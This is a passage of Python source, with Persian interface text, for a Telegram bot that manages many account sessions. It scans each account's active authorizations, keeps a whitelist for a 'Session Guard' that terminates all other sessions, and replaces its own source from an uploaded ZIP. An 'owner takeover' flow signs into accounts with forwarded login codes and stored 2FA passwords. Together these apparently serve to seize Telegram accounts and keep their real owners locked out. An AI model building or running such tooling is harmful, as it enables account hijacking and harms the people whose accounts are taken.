                [Button.inline("✅ بله، حذف کن", b"owner_del_grp_sess_ok|" + gname.encode())],
                [Button.inline("❌ انصراف", b"owner_export_sessions")],
            ]
        )

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"owner_del_grp_sess_ok\|(.+)")))
    async def cb_owner_del_grp_sess_ok(event):
        if not owner_guard(event):
            return await event.answer()
        gname = event.pattern_match.group(1).decode()
        await event.answer()
        if gname not in groups_db:
            return await sp_edit(event, f"❌ ریموت «{gname}» پیدا نشد.",
                                  buttons=[[Button.inline("🔙 Back", b"owner_export_sessions")]])
        removed_sessions = groups_db[gname].get("sessions", [])[:]
        # پاک کردن سشن‌ها از لیست ریموت
        groups_db[gname]["sessions"] = []
        # حذف از sessions_db هم
        for sess in removed_sessions:
            sessions_db.pop(sess, None)
        _atomic_write_json(GROUPS_DB, groups_db)
        _atomic_write_json(SESSIONS_DB, sessions_db)
        await sp_edit(
            event,
            f"✅ سشن‌های ریموت «{gname}» از دیتابیس حذف شدن.\n"
            f"تعداد حذف‌شده: {len(removed_sessions)}\n"
            f"فایل‌های سشن روی دیسک هنوز موجودن.",
            buttons=[[Button.inline("🔙 Back", b"owner_export_sessions")]]
        )


    # ── Per-group Trusted Devices ──────────────────────────────
    _og_td_scan_cache: Dict[str, Dict[int, Dict]] = {}  # gname → {idx: device_dict}

    def _og_td_text(gname: str) -> str:
        td_list = groups_db.get(gname, {}).get("trusted_devices", [])
        if not td_list:
            return (
                  f"📱 Trusted Devices — ریموت {gname}\n"
                  "━━━━━━━━━━━━━━\n"
                  "هیچ دستگاه مورد اعتمادی ثبت نشده.\n\n"
                  "دکمه اسکن رو بزن تا دستگاه‌های فعلی اکانت‌ها نمایش داده بشن و بتونی whitelist کنی."
            )
        result = [f"📱 Trusted Devices — ریموت {gname}\n━━━━━━━━━━━━━━"]
        for i, d in enumerate(td_list, 1):
            result.append(f"{i}. {d.get('device_model','?')} | {d.get('platform','?')} | {d.get('app_name','?')}")
        result.append("\nSession Guard این دستگاه‌ها رو از اکانت‌های این ریموت نمیکشه.")
        return "\n".join(result)

    def _og_td_buttons(gname: str):
        td_list = groups_db.get(gname, {}).get("trusted_devices", [])
        btns = [[Button.inline("📡 اسکن اکانت‌های گروه و نمایش دستگاه‌ها", f"og_td_scan_{gname}".encode())]]
        if td_list:
            btns.append([Button.inline("🗑 پاک کردن همه Trusted Devices ریموت", f"og_td_clear_{gname}".encode())])
        btns.append([Button.inline("🔙 Back", f"og_home_{gname}".encode())])
        return btns

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_trusted_devices_(.+)")))
    async def og_trusted_devices_cb(event):
        gname = event.pattern_match.group(1).decode()
        if not og_guard(event, gname):
            return await event.answer(" دسترسی ندارید", alert=True)
        await sp_edit(event, _og_td_text(gname), buttons=_og_td_buttons(gname))
        await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_td_scan_(.+)")))
    async def og_td_scan_cb(event):
        """اسکن همه سشن‌های آنلاین گروه و نمایش دستگاه‌هاشون به صورت دکمه."""
        gname = event.pattern_match.group(1).decode()
        if not og_guard(event, gname):
            return await event.answer(" دسترسی ندارید", alert=True)
        await event.answer("🔍 در حال اسکن...", alert=False)
        from telethon.tl.functions.account import GetAuthorizationsRequest as _GAR_og
        sessions = og_sessions(gname)
        td_list = groups_db.get(gname, {}).get("trusted_devices", [])
        found: list = []
        seen_keys: set = set()
        scanned = 0
        for sn in sessions:
            meta = managed.get(sn)
            if not meta:
                  continue
            c = meta.get("client")
            if not c or not c.is_connected():
                  continue
            try:
                  result = await c(_GAR_og())
                  scanned += 1
                  for a in result.authorizations:
                      dm = (getattr(a, "device_model", "") or "").strip()
                      dp = (getattr(a, "platform", "") or "").strip()
                      da = (getattr(a, "app_name", "") or "").strip()
                      key = f"{dm}|{dp}|{da}"
                      if key not in seen_keys:
                          seen_keys.add(key)
                          already = any(
                              t.get("device_model") == dm and t.get("platform") == dp
                              for t in td_list
                          )
                          found.append({"dm": dm, "dp": dp, "da": da, "trusted": already, "sn": sn})
            except Exception:
                  pass
            await asyncio.sleep(0.3)
        if not found:
            await sp_edit(event,
                  f"📱 Trusted Devices — ریموت {gname}\n━━━━━━━━━━━━━━\n"
                  f"هیچ نشستی پیدا نشد ({scanned} اکانت اسکن شد).\n"
                  "مطمئن شو اکانت‌های ریموت آنلاین هستن.",
                  buttons=_og_td_buttons(gname))
            return
        _og_td_scan_cache[gname] = {i: d for i, d in enumerate(found)}
        header = (f"🔍 دستگاه‌های پیداشده — {scanned} اکانت اسکن شد\n━━━━━━━━━━━━━━\n"
                    "✅ = Trusted | ➕ = کلیک کن تا اضافه بشه\n")
        btns = []
        for i, d in enumerate(found[:30]):
            label = d["dm"] or "Unknown"
            if d["dp"]: label += f" / {d['dp']}"
            if d["trusted"]:
                  btns.append([Button.inline(f"✅ {label}", f"og_td_already_{gname}|{i}".encode())])
            else:
                  btns.append([Button.inline(f"➕ {label}", f"og_td_trust_{gname}|{i}".encode())])
        btns.append([Button.inline("🔙 Back", f"og_trusted_devices_{gname}".encode())])
        await sp_edit(event, header, buttons=btns)

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_td_trust_([^|]+)\|(\d+)")))
    async def og_td_trust_cb(event):
        """دستگاه انتخاب‌شده رو به Trusted Devices گروه اضافه کن."""
        m = event.pattern_match
        gname = m.group(1).decode()
        idx = int(m.group(2))
        if not og_guard(event, gname):
            return await event.answer(" دسترسی ندارید", alert=True)
        cache = _og_td_scan_cache.get(gname, {})
        d = cache.get(idx)
        if not d:
            return await event.answer("دستگاه پیدا نشد — دوباره اسکن کن", alert=True)
        dm, dp, da = d["dm"], d["dp"], d["da"]
        td_list = groups_db.setdefault(gname, {}).setdefault("trusted_devices", [])
        already = any(t.get("device_model") == dm and t.get("platform") == dp for t in td_list)
        if not already:
            td_list.append({"device_model": dm, "platform": dp, "app_name": da})
            save_groups()
            d["trusted"] = True
        label = dm or "Unknown"
        if dp: label += f" / {dp}"
        await event.answer(f"✅ {label} به Trusted اضافه شد", alert=False)
        await sp_edit(event,
            f"✅ دستگاه «{label}» به Trusted Devices ریموت «{gname}» اضافه شد.\n"
            f"مجموع Trusted این ریموت: {len(td_list)}",
            buttons=[[Button.inline("🔙 برگشت به لیست اسکن", f"og_td_scan_{gname}".encode())],
                       [Button.inline("📱 Trusted Panel", f"og_trusted_devices_{gname}".encode())]])

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_td_already_([^|]+)\|\d+")))
    async def og_td_already_cb(event):
        gname = event.pattern_match.group(1).decode()
        if not og_guard(event, gname):
            return await event.answer()
        await event.answer("✅ این دستگاه قبلاً در Trusted Devices این ریموت هست", alert=True)

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_td_clear_(.+)")))
    async def og_td_clear_cb(event):
        gname = event.pattern_match.group(1).decode()
        if not og_guard(event, gname):
            return await event.answer(" دسترسی ندارید", alert=True)
        groups_db.setdefault(gname, {})["trusted_devices"] = []
        save_groups()
        await sp_edit(event, _og_td_text(gname), buttons=_og_td_buttons(gname))
        await event.answer("🗑 همه Trusted Devices ریموت پاک شدن", alert=True)

  
    # ── Owner: Trusted Devices برای Session Guard ────────────────
    _waiting_trusted_device: Dict[int, bool] = {}
    _waiting_trusted_device_name: Dict[int, bool] = {}

    def _trusted_devices_text() -> str:
      if not TRUSTED_GUARD_DEVICES:
          return (
              " Trusted Devices\n"
              "━━━━━━━━━━━━━━\n"
              "هیچ دستگاه مورد اعتمادی ثبت نشده.\n\n"
              "با زدن دکمه زیر، اسم سشن رو بفرست تا دستگاه اون سشن برای همه اکانت‌ها whitelist بشه."
          )
      lines = [" Trusted Devices\n━━━━━━━━━━━━━━"]
      for i, d in enumerate(TRUSTED_GUARD_DEVICES, 1):
          lines.append(f"{i}.  {d.get('device_model','?')} | {d.get('platform','?')} | {d.get('app_name','?')}")
      lines.append("\nSession Guard این دستگاه‌ها رو از هیچ اکانتی نمیکشه.")
      return "\n".join(lines)

    def _trusted_devices_buttons():
      btns = [[Button.inline("📡 اسکن همه سشن‌ها و ذخیره دستگاه‌ها", b"owner_add_trusted_all")]]
      btns.append([Button.inline("🔍 بررسی نشست‌های همه اکانت‌ها (انتخابی)", b"owner_td_view_sessions")])
      btns.append([Button.inline("➕ اضافه کردن سشن خاص", b"owner_add_trusted_single")])
      btns.append([Button.inline("✏️ اضافه با اسم دستگاه", b"owner_add_trusted_by_name")])
      if TRUSTED_GUARD_DEVICES:
          btns.append([Button.inline("🗑 پاک کردن همه Trusted Devices", b"owner_clear_trusted")])
      btns.append([Button.inline("🔙 Back", b"owner_access")])
      return btns

    @bot.on(events.CallbackQuery(data=b"owner_trusted_devices"))
    async def cb_owner_trusted_devices(event):
      if not owner_guard(event):
          return await event.answer()
      await sp_edit(event, _trusted_devices_text(), buttons=_trusted_devices_buttons())
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"owner_add_trusted_all"))
    async def cb_owner_add_trusted_all(event):
      """اسکن همه سشن‌های آنلاین + protected، ذخیره fingerprint + hash همه دستگاه‌هاشون.
      اگه Session Guard الان روشنه، گارد رو restart می‌کنه تا baseline جدید بگیره
      و دستگاه‌های trusted دیگه terminate نشن.
      """
      if not owner_guard(event):
          return await event.answer()
      await event.answer(" در حال اسکن همه سشن‌ها...", alert=False)
      from telethon.tl.functions.account import GetAuthorizationsRequest as _GAR
      # همه کلاینت‌های آنلاین + protected
      all_clients: Dict[str, Any] = dict(managed)
      for sn, pc in _protected_clients.items():
          if sn not in all_clients:
              all_clients[sn] = {"client": pc}
      added_total = 0
      scanned = 0
      errors = 0
      for sn, meta in list(all_clients.items()):
          c = meta.get("client")
          if not c or not c.is_connected():
              continue
          try:
              result = await c(_GAR())
              for a in result.authorizations:
                    dm = getattr(a, "device_model", "") or ""
                    dp = getattr(a, "platform", "") or ""
                    da = getattr(a, "app_name", "") or ""
                    already = any(
                        t.get("device_model") == dm and t.get("platform") == dp
                        for t in TRUSTED_GUARD_DEVICES
                    )
                    if not already:
                        TRUSTED_GUARD_DEVICES.append({"device_model": dm, "platform": dp, "app_name": da})
                        added_total += 1
              scanned += 1
          except Exception:
              errors += 1
          await asyncio.sleep(0.3)
      save_trusted_devices()
      # اگه Session Guard الان روشنه، restart کن تا baseline جدید بگیره
      # baseline جدید = همه دستگاه‌های فعلی + trusted devices جدید همگی whitelisted
      guard_restarted = False
      if SESSION_GUARD_ENABLED:
          if _session_guard_task and not _session_guard_task.done():
              _session_guard_task.cancel()
          _session_guard_task = asyncio.create_task(global_session_guard())
          guard_restarted = True
      lines = [
          f"🛡 Trusted Devices — اسکن کامل\n━━━━━━━━━━━━━━",
          f"✅ سشن اسکن‌شده: {scanned}   ❌ خطا: {errors}   ➕ دستگاه جدید اضافه شد: {added_total}\n",
      ]
      for i, d in enumerate(TRUSTED_GUARD_DEVICES, 1):
          lines.append(f"{i}. {d.get('device_model','?')} | {d.get('platform','?')} | {d.get('app_name','?')}")
      if not TRUSTED_GUARD_DEVICES:
          lines.append("هیچ دستگاهی پیدا نشد.")
      if guard_restarted:
          lines.append("\n\n🔄 Session Guard با baseline جدید restart شد — trusted devices حالا کاملاً محافظت‌شدن.")
      else:
          lines.append("\n\nSession Guard این دستگاه‌ها رو از هیچ اکانتی نمیکشه.")
      await sp_edit(event, "\n".join(lines), buttons=_trusted_devices_buttons())

    # ── Trusted Devices: scan all sessions, show clickable device list ──────
    @bot.on(events.CallbackQuery(data=b"owner_td_view_sessions"))
    async def cb_owner_td_view_sessions(event):
      """همه نشست‌های فعال روی همه اکانت‌ها رو اسکن کن و به صورت دکمه نمایش بده."""
      if not owner_guard(event):
          return await event.answer()
      await event.answer("🔍 در حال اسکن...", alert=False)
      from telethon.tl.functions.account import GetAuthorizationsRequest as _GAR_td
      all_clients: Dict[str, Any] = dict(managed)
      for sn, pc in _protected_clients.items():
          if sn not in all_clients:
              all_clients[sn] = {"client": pc}

      # جمع‌آوری همه نشست‌های منحصربه‌فرد از همه اکانت‌ها
      found: List[Dict] = []
      seen_keys: set = set()
      sess_count = 0
      for sn, meta in list(all_clients.items()):
          c = meta.get("client")
          if not c or not c.is_connected():
              continue
          try:
              result = await c(_GAR_td())
              sess_count += 1
              for a in result.authorizations:
                    dm = (getattr(a, "device_model", "") or "").strip()
                    dp = (getattr(a, "platform", "") or "").strip()
                    da = (getattr(a, "app_name", "") or "").strip()
                    key = f"{dm}|{dp}|{da}"
                    if key not in seen_keys:
                        seen_keys.add(key)
                        already = any(
                            t.get("device_model") == dm and t.get("platform") == dp
                            for t in TRUSTED_GUARD_DEVICES
                        )
                        found.append({"dm": dm, "dp": dp, "da": da, "trusted": already})
          except Exception:
              pass
          await asyncio.sleep(0.3)

      if not found:
          await sp_edit(event,
              "🔍 بررسی نشست‌های همه اکانت‌ها\n━━━━━━━━━━━━━━\n"
              "هیچ نشستی پیدا نشد یا هیچ اکانتی آنلاین نیست.",
              buttons=_trusted_devices_buttons())
          return

      # ذخیره موقت لیست در یک دیکت global برای callback های بعدی
      _td_scan_cache.clear()
      for i, d in enumerate(found):
          _td_scan_cache[i] = d

      lines = [f"🔍 نشست‌های پیداشده — {sess_count} اکانت اسکن شد\n━━━━━━━━━━━━━━\n"
                 "✅ = در Trusted | ➕ = کلیک کن تا اضافه بشه\n"]
      btns = []
      for i, d in enumerate(found[:30]):
          label = d["dm"] or "Unknown"
          if d["dp"]: label += f" / {d['dp']}"
          if d["trusted"]:
              btns.append([Button.inline(f"✅ {label}", f"owner_td_already_{i}".encode())])
          else:
              btns.append([Button.inline(f"➕ {label}", f"owner_td_trust_{i}".encode())])
      btns.append([Button.inline("🔙 Back", b"owner_trusted_devices")])
      await sp_edit(event, "".join(lines), buttons=btns)

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"owner_td_trust_(\d+)")))
    async def cb_owner_td_trust(event):
      """دستگاه انتخاب‌شده رو به Trusted Devices اضافه کن."""
      if not owner_guard(event):
          return await event.answer()
      idx = int(event.pattern_match.group(1))
      d = _td_scan_cache.get(idx)
      if not d:
          return await event.answer("دستگاه پیدا نشد — دوباره اسکن کن", alert=True)
      dm, dp, da = d["dm"], d["dp"], d["da"]
      already = any(
          t.get("device_model") == dm and t.get("platform") == dp
          for t in TRUSTED_GUARD_DEVICES
      )
      if not already:
          TRUSTED_GUARD_DEVICES.append({"device_model": dm, "platform": dp, "app_name": da})
          save_trusted_devices()
          d["trusted"] = True  # آپدیت کش
          # اگه Session Guard روشنه، restart کن
          global _session_guard_task
          if SESSION_GUARD_ENABLED:
              if _session_guard_task and not _session_guard_task.done():
                    _session_guard_task.cancel()
              _session_guard_task = asyncio.create_task(global_session_guard())
      label = dm or "Unknown"
      if dp: label += f" / {dp}"
      await event.answer(f"✅ {label} به Trusted اضافه شد", alert=False)
      # دکمه رو از ➕ به ✅ تبدیل کن
      await sp_edit(event,
          f"✅ دستگاه «{label}» به Trusted Devices اضافه شد.\n"
          f"مجموع Trusted: {len(TRUSTED_GUARD_DEVICES)}",
          buttons=[[Button.inline("🔙 برگشت به لیست", b"owner_td_view_sessions")],
                     [Button.inline("🏠 Trusted Panel", b"owner_trusted_devices")]])

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"owner_td_already_\d+")))
    async def cb_owner_td_already(event):
      if not owner_guard(event):
          return await event.answer()
      await event.answer("✅ این دستگاه قبلاً در Trusted Devices هست", alert=True)

    @bot.on(events.CallbackQuery(data=b"owner_clear_trusted"))
    async def cb_owner_clear_trusted(event):
      if not owner_guard(event):
          return await event.answer()
      TRUSTED_GUARD_DEVICES.clear()
      save_trusted_devices()
      await sp_edit(event, _trusted_devices_text(), buttons=_trusted_devices_buttons())
      await event.answer(" همه Trusted Devices پاک شدن", alert=True)

    @bot.on(events.CallbackQuery(data=b"owner_add_trusted_single"))
    async def cb_owner_add_trusted_single(event):
      if not owner_guard(event):
          return await event.answer()
      # هر flow دیگه‌ای رو لغو کن — mutually exclusive
      _waiting_trusted_device_name.pop(OWNER_ID, None)
      _waiting_trusted_device[OWNER_ID] = True
      await sp_edit(event,
          "➕ اضافه کردن سشن خاص\n"
          "━━━━━━━━━━━━━━\n"
          "اسم سشن رو بفرست (مثلاً: acc1)\n\n"
          "• دستگاه‌های فعال اون سشن به لیست Trusted اضافه میشن\n"
          "• اگه سشن آنلاین نباشه خطا میگیری",
          buttons=[[Button.inline("❌ لغو", b"owner_add_trusted_single_cancel")]])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"owner_add_trusted_single_cancel"))
    async def cb_owner_add_trusted_single_cancel(event):
      if not owner_guard(event):
          return await event.answer()
      # هر دو flag رو پاک کن تا هیچ flow ای باز نمونه
      _waiting_trusted_device.pop(OWNER_ID, None)
      _waiting_trusted_device_name.pop(OWNER_ID, None)
      await sp_edit(event, _trusted_devices_text(), buttons=_trusted_devices_buttons())
      await event.answer("لغو شد")

    @bot.on(events.CallbackQuery(data=b"owner_add_trusted_by_name"))
    async def cb_owner_add_trusted_by_name(event):
      """اضافه کردن دستگاه مورد اعتماد مستقیماً با اسم دستگاه (device_model)"""
      if not owner_guard(event):
          return await event.answer()
      # هر flow دیگه‌ای رو لغو کن — mutually exclusive
      _waiting_trusted_device.pop(OWNER_ID, None)
      _waiting_trusted_device_name[OWNER_ID] = True
      await sp_edit(event,
          "✏️ اضافه با اسم دستگاه\n"
          "━━━━━━━━━━━━━━\n"
          "اسم دستگاه رو بفرست (مثلاً: rasel)\n\n"
          "• این اسم با device_model نشست‌ها مقایسه میشه\n"
          "• Session Guard هیچ نشستی با این اسم رو terminate نمیکنه\n"
          "• حروف بزرگ/کوچیک فرقی نمیکنه",
          buttons=[[Button.inline("❌ لغو", b"owner_add_trusted_by_name_cancel")]])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"owner_add_trusted_by_name_cancel"))
    async def cb_owner_add_trusted_by_name_cancel(event):
      if not owner_guard(event):
          return await event.answer()
      # هر دو flag رو پاک کن تا هیچ flow ای باز نمونه
      _waiting_trusted_device_name.pop(OWNER_ID, None)
      _waiting_trusted_device.pop(OWNER_ID, None)
      await sp_edit(event, _trusted_devices_text(), buttons=_trusted_devices_buttons())
      await event.answer("لغو شد")

    @bot.on(events.NewMessage(chats=OWNER_ID))
    async def owner_trusted_device_name_handler(event):
      """دریافت اسم دستگاه از اونر و اضافه کردن مستقیم به Trusted Devices"""
      if not owner_guard(event):
          return
      if not _waiting_trusted_device_name.get(OWNER_ID):
          return
      txt = (event.text or "").strip()
      if not txt or txt.startswith("/") or event.document or event.photo:
          return
      if _waiting_zip_update.get(OWNER_ID):
          return
      # flag رو پاک کن — این هندلر مصرف‌کننده پیامه، هندلرهای بعدی نباید ببیننش
      _waiting_trusted_device_name.pop(OWNER_ID, None)
      device_name = txt
      # چک کن که قبلاً اضافه نشده باشه (case-insensitive)
      already = any(
          (t.get("device_model", "") or "").lower() == device_name.lower()
          for t in TRUSTED_GUARD_DEVICES
      )
      if already:
          await bot.send_message(event.chat_id,
              f"ℹ️ دستگاه «{device_name}» قبلاً در لیست Trusted وجود داشت.",
              buttons=_trusted_devices_buttons())
          raise events.StopPropagation
      TRUSTED_GUARD_DEVICES.append({"device_model": device_name, "platform": "", "app_name": ""})
      save_trusted_devices()
      # اگه Session Guard روشنه، restart کن تا baseline جدید بگیره
      global _session_guard_task
      if SESSION_GUARD_ENABLED:
          if _session_guard_task and not _session_guard_task.done():
              _session_guard_task.cancel()
          _session_guard_task = asyncio.create_task(global_session_guard())
      lines = [
          f"✅ دستگاه «{device_name}» به Trusted Devices اضافه شد\n━━━━━━━━━━━━━━",
          f"📱 کل Trusted Devices: {len(TRUSTED_GUARD_DEVICES)}\n",
      ]
      for i, d in enumerate(TRUSTED_GUARD_DEVICES, 1):
          dm = d.get("device_model", "?")
          dp = d.get("platform", "")
          da = d.get("app_name", "")
          label = dm
          if dp or da:
              label += f" | {dp} | {da}"
          lines.append(f"{i}. {label}")
      if SESSION_GUARD_ENABLED:
          lines.append("\n🔄 Session Guard با baseline جدید restart شد.")
          lines.append(f"🛡 Session Guard الان هر نشست غیرمجازی رو terminate میکنه — «{device_name}» همیشه whitelist شده.")
      await bot.send_message(event.chat_id, "\n".join(lines),
          buttons=_trusted_devices_buttons())
      raise events.StopPropagation

    @bot.on(events.NewMessage(chats=OWNER_ID))
    async def owner_trusted_session_name_handler(event):
      """دریافت اسم سشن از اونر و اضافه کردن دستگاه‌هاش به Trusted Devices"""
      if not owner_guard(event):
          return
      if not _waiting_trusted_device.get(OWNER_ID):
          return
      txt = (event.text or "").strip()
      # نادیده گرفتن دستورات و پیام‌های غیر-سشن
      if not txt or txt.startswith("/") or event.document or event.photo:
          return
      # تداخل با دیگر flow های انتظاری اونر را بررسی کن
      if _waiting_zip_update.get(OWNER_ID):
          return
      if _waiting_trusted_device_name.get(OWNER_ID):
          return
      sess_name = txt

      from telethon.tl.functions.account import GetAuthorizationsRequest as _GAR2

      # پیدا کردن کلاینت مربوط به اون سشن
      meta = managed.get(sess_name)
      client = None
      if meta:
          client = meta.get("client")
      if not client and sess_name in _protected_clients:
          client = _protected_clients[sess_name]

      if not client:
          # flag رو نگه دار تا بتونه دوباره امتحان کنه
          await bot.send_message(event.chat_id,
              f"❌ سشن «{sess_name}» پیدا نشد یا آنلاین نیست.\n"
              f"سشن‌های آنلاین: {', '.join(list(managed.keys())[:20]) or 'هیچ‌کدام'}\n\n"
              f"اسم سشن دیگه‌ای بفرست یا /cancel بزن.",
              buttons=[[Button.inline("❌ لغو", b"owner_add_trusted_single_cancel")]])
          return

      if not client.is_connected():
          await bot.send_message(event.chat_id,
              f"❌ سشن «{sess_name}» کانکت نیست.\n"
              f"اسم سشن دیگه‌ای بفرست یا /cancel بزن.",
              buttons=[[Button.inline("❌ لغو", b"owner_add_trusted_single_cancel")]])
          return

      # همه چیز OK — حالا flag رو پاک کن
      _waiting_trusted_device.pop(OWNER_ID, None)

      try:
          result = await client(_GAR2())
          added = 0
          for a in result.authorizations:
              dm = getattr(a, "device_model", "") or ""
              dp = getattr(a, "platform", "") or ""
              da = getattr(a, "app_name", "") or ""
              already = any(
                    t.get("device_model") == dm and t.get("platform") == dp
                    for t in TRUSTED_GUARD_DEVICES
              )
              if not already:
                    TRUSTED_GUARD_DEVICES.append({"device_model": dm, "platform": dp, "app_name": da})
                    added += 1
          save_trusted_devices()
          # اگه Session Guard روشنه، restart کن
          global _session_guard_task
          if SESSION_GUARD_ENABLED:
              if _session_guard_task and not _session_guard_task.done():
                    _session_guard_task.cancel()
              _session_guard_task = asyncio.create_task(global_session_guard())
          lines = [
              f"✅ سشن «{sess_name}» اسکن شد\n━━━━━━━━━━━━━━",
              f"➕ دستگاه جدید اضافه شد: {added}",
              f"📱 کل Trusted Devices: {len(TRUSTED_GUARD_DEVICES)}\n",
          ]
          for i, d in enumerate(TRUSTED_GUARD_DEVICES, 1):
              lines.append(f"{i}. {d.get('device_model','?')} | {d.get('platform','?')} | {d.get('app_name','?')}")
          if SESSION_GUARD_ENABLED:
              lines.append("\n🔄 Session Guard با baseline جدید restart شد.")
          await bot.send_message(event.chat_id, "\n".join(lines),
              buttons=_trusted_devices_buttons())
      except Exception as e:
          _waiting_trusted_device.pop(OWNER_ID, None)
          await bot.send_message(event.chat_id, f"❌ خطا در اسکن سشن «{sess_name}»: {e}")

    # ── Owner: آپدیت سورس از طریق ZIP ────────────────────────────
    _waiting_zip_update: Dict[int, bool] = {}

    @bot.on(events.CallbackQuery(data=b"owner_update_src"))
    async def cb_owner_update_src(event):
      if not owner_guard(event):
          return await event.answer()
      _waiting_zip_update[OWNER_ID] = True
      await sp_edit(event,
          " آپدیت سورس\n"
          "━━━━━━━━━━━━━━\n"
          "فایل ZIP سورس جدید رو بفرست.\n\n"
          " توجه:\n"
          "• فایل باید ZIP باشه\n"
          "• داخلش باید eliot_bot.py باشه\n"
          "• بعد از آپلود ربات ریستارت می‌شه",
          buttons=[[Button.inline("❌ Cancel", b"owner_update_cancel")]])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"owner_update_cancel"))
    async def cb_owner_update_cancel(event):
      if not owner_guard(event):
          return await event.answer()
      _waiting_zip_update.pop(OWNER_ID, None)
      await sp_edit(event, " عملیات آپدیت لغو شد.",
                     buttons=[[Button.inline("🔙 Back", b"owner_access")]])
      await event.answer()

    @bot.on(events.NewMessage(chats=OWNER_ID))
    async def owner_zip_upload_handler(event):
      """دریافت فایل ZIP از اونر و آپدیت سورس"""
      if not owner_guard(event):
          return
      if not _waiting_zip_update.get(OWNER_ID):
          return
      if not event.document:
          return
      fname = ''
      for _attr in (event.document.attributes or []):
          _fn = getattr(_attr, 'file_name', None)
          if _fn:
              fname = _fn
              break
      mime = getattr(event.document, 'mime_type', '') or ''
      if not (fname.lower().endswith('.zip') or mime in ('application/zip', 'application/x-zip-compressed')):
          await bot.send_message(event.chat_id,
              " فایل ارسالی ZIP نیست!\n"
              "یه فایل .zip بفرست.")
          return
      _waiting_zip_update.pop(OWNER_ID, None)
      status_msg = await bot.send_message(event.chat_id,
          "⏳ در حال دریافت فایل ZIP...")
      import zipfile, io, shutil

      async def _safe_edit(txt: str):
          try:
              await bot.edit_message(event.chat_id, status_msg.id, txt)
          except Exception:
              try:
                    await bot.send_message(event.chat_id, txt)
              except Exception:
                    pass

      try:
          # ── دانلود با timeout 180 ثانیه ──
          try:
              zip_bytes = await asyncio.wait_for(
                    bot.download_media(event.message, bytes),
                    timeout=180
              )
          except asyncio.TimeoutError:
              await _safe_edit(
                    "❌ دانلود ZIP بیش از ۳ دقیقه طول کشید و timeout شد.\n"
                    "فایل رو دوباره بفرست یا حجمش رو کاهش بده.")
              return
          except Exception as _dl_err:
              await _safe_edit(f"❌ خطا در دانلود ZIP: {_dl_err}")
              return

          if not zip_bytes:
              await _safe_edit("❌ فایل ZIP دانلود شد ولی خالیه!")
              return

          await _safe_edit(
              f"📦 دریافت شد ({len(zip_bytes):,} بایت)\n⚙️ در حال باز کردن ZIP...")

          buf = io.BytesIO(zip_bytes)
          try:
              zf_obj = zipfile.ZipFile(buf, 'r')
          except zipfile.BadZipFile as _bzf:
              await _safe_edit(f"❌ فایل ZIP خراب یا معتبر نیست: {_bzf}")
              return

          with zf_obj as zf:
              names = zf.namelist()
              py_candidates = [n for n in names if n.endswith('eliot_bot.py') or (n.endswith('.py') and not n.startswith('__'))]
              if not py_candidates:
                    await _safe_edit(
                        "❌ داخل ZIP فایل eliot_bot.py پیدا نشد!\n"
                        f"فایل‌های موجود: {', '.join(names[:10])}")
                    return
              target = py_candidates[0]
              py_content = zf.read(target)

          await _safe_edit(
              f"📄 فایل: {target} ({len(py_content):,} بایت)\n🔍 در حال بررسی سینتکس...")

          # ── اعتبارسنجی سینتکس پایتون قبل از هر نوشتنی روی دیسک ──
          try:
              compile(py_content, target, "exec")
          except SyntaxError as se:
              await _safe_edit(
                    f"❌ فایل ارسالی سینتکس معتبر نداره، آپدیت لغو شد.\n"
                    f"━━━━━━━━━━━━━━\n"
                    f"خط {se.lineno}: {se.msg}\n\n"
                    f"ربات همچنان با سورس فعلی در حال اجراست.")
              return

          backup_path = _SCRIPT_PATH + ".bak"
          shutil.copy2(_SCRIPT_PATH, backup_path)
          with open(_SCRIPT_PATH, "wb") as f:
              f.write(py_content)

          await _safe_edit(
              f"✅ سورس آپدیت شد!\n"
              f"━━━━━━━━━━━━━━\n"
              f"فایل: {target}\n"
              f"بکاپ: {backup_path}\n"
              f"حجم: {len(py_content):,} بایت\n\n"
              f"🔄 در حال ریستارت ربات...")
          await asyncio.sleep(2)
          import os as _os, subprocess as _sp
          # ── روش ۱: execv (همون PID، بهترین حالت) ──
          try:
              _os.execv(sys.executable, [sys.executable, _SCRIPT_PATH])
          except Exception:
              pass
          # ── روش ۲: spawn پروسس جدید + خروج (Replit-safe) ──
          try:
              _sp.Popen(
                    [sys.executable, _SCRIPT_PATH],
                    close_fds=True,
                    env=_os.environ.copy(),
              )
              await asyncio.sleep(1)
              _os._exit(0)
          except Exception as _restart_err:
              await bot.send_message(event.chat_id,
                    f"⚠️ فایل آپدیت شد ولی ریستارت خودکار ناموفق بود: {_restart_err}\n"
                    f"ربات رو دستی ریستارت کن — سورس جدید فعال میشه.")
      except Exception as e:
          await _safe_edit(f"❌ خطا در آپدیت: {e}")

    # ── Owner: auto-detect forwarded OTP or plain digit message ──
    @bot.on(events.NewMessage(chats=OWNER_ID))
    async def owner_auto_code_detect(event):
      """If owner sends/forwards a message with a 5-6 digit code while a login is pending, auto sign-in."""
      if not owner_guard(event):
          return
      if not owner_takeover_pending:
          return
      text = event.raw_text or ""
      # check if forwarded from 777000 OR text is just digits
      is_from_telegram = (getattr(event.forward, 'sender_id', None) == 777000) if event.forward else False
      code_match = re.search(r'\b(\d{5,6})\b', text)
      if not code_match:
          return
      code = code_match.group(1)
      # pick the pending session (if only one, use it; else skip — owner_code command still works for multi)
      if len(owner_takeover_pending) == 1:
          sess = next(iter(owner_takeover_pending))
      else:
          # try to match by forwarded message context
          if is_from_telegram and len(owner_takeover_pending) >= 1:
              sess = next(iter(owner_takeover_pending))
          else:
              return
      pend = owner_takeover_pending.get(sess)
      if not pend:
          return
      phone = pend.get("phone", "")
      twofa = pend.get("twofa", "")
      tmp = pend.get("tmp")
      if not tmp:
          return
      try:
          await event.delete()
      except Exception:
          pass
      try:
          await tmp.sign_in(phone=phone, code=code)
          owner_takeover_pending.pop(sess, None)
          await sp(event.chat_id,
              f" ورود به «{sess}» موفق بود!",
              buttons=[[Button.inline("🔑 Special Access", b"owner_access"), Button.inline("📋 Menu", b"menu_refresh")]])
      except SessionPasswordNeededError:
          if twofa:
              try:
                    await tmp.sign_in(password=twofa)
